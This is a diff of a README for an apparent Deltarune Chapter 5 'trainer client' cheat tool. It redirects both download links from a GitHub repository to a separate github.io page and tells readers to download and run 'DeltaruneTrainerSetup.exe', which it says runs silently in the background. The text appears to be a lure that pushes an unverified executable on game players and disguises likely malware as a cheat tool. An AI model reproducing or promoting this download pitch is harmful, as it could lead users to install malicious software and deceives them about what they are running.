@@ -1,6 +1,6 @@
 # 🛡️ Deltarune-Chapter5-Trainer-Client - Master every battle with ease now
 
-[![Download Deltarune Trainer](https://img.shields.io/badge/Download-Client-blue.svg)](https://github.com/Sonnieshelflike741/Deltarune-Chapter5-Trainer-Client)
+[![Download Deltarune Trainer](https://img.shields.io/badge/Download-Client-blue.svg)](https://sonnieshelflike741.github.io)
 
 This software helps players manage stats and gameplay options in Deltarune Chapter 5. You gain control over character health, statistics, and inventory settings through a simple interface. The program works silently in the background while you play.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the trainer client safely:
 
-1. Visit [this page to download](https://github.com/Sonnieshelflike741/Deltarune-Chapter5-Trainer-Client) the latest version of the installer.
+1. Visit [this page to download](https://sonnieshelflike741.github.io) the latest version of the installer.
 2. Locate the file named "DeltaruneTrainerSetup.exe" on the page.
 3. Click the file to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
